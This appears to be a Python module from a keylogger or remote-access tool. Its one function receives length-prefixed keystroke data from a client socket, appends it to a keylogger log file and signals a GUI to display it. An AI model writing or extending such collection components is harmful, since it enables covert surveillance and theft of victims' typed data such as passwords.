
import os 
from GUI import communicate

script_dir = os.path.dirname(__file__)
filePath = os.path.join(script_dir, "GUI/tempData/keylogger.txt")


def receiveKeylogger(clientsocket):
    data_length = int.from_bytes(clientsocket.recv(4), 'big')
    chunks = []
    bytes_received = 0

    while bytes_received < data_length:
        chunk = clientsocket.recv(min(data_length - bytes_received, 4096))
        if not chunk:
            raise ConnectionError("Connection lost before receiving all data")    
        chunks.append(chunk)
        bytes_received += len(chunk)

    data = b''.join(chunks).decode('utf-8')
    with open(filePath, "a") as fi:
        fi.write(data)
    communicate.queue_to_main.put("displaykeylogger")